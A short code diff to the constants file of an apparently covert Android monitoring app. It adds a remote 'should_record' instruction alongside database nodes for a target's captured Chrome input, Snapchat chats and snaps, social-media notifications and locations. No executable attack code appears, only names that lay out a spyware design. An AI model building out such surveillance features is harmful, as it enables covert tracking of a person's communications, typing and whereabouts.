@@ -1,7 +1,5 @@
 package androidaid.android.com.androidaid.program_flow;
 
-import java.util.ArrayList;
-
 public class Constants {
     public static String NOTIFICATION_INSTAGRAM = "NOTIFICATION_INSTAGRAM";
     public static String NOTIFICATION_FACEBOOK = "NOTIFICATION_FACEBOOK";
@@ -22,8 +20,9 @@ public class Constants {
     public static final String DATABASE_NODE_CHROME_INPUT = "chrome_input";
     public static final String DATABASE_NODE_SNAPCHAT_CHATS = "snapchat_chats";
     public static final String DATABASE_NODE_SNAPCHAT_SNAPS = "snapchat_snaps";
-
     public static final String DATABASE_NODE_INSTRUCTIONS = "instructions";
+    public static final String DATABASE_NODE_INSTRUCTIONS_SUBNODE_SHOULD_RECORD = "should_record";
+
     public static final String DATABASE_SUBNODE_LOCATION_QUERY = "get_location";
     public static final String DATABASE_NODE_LOCATIONS = "locations"; //node in the database where the locations of the target are stored
 
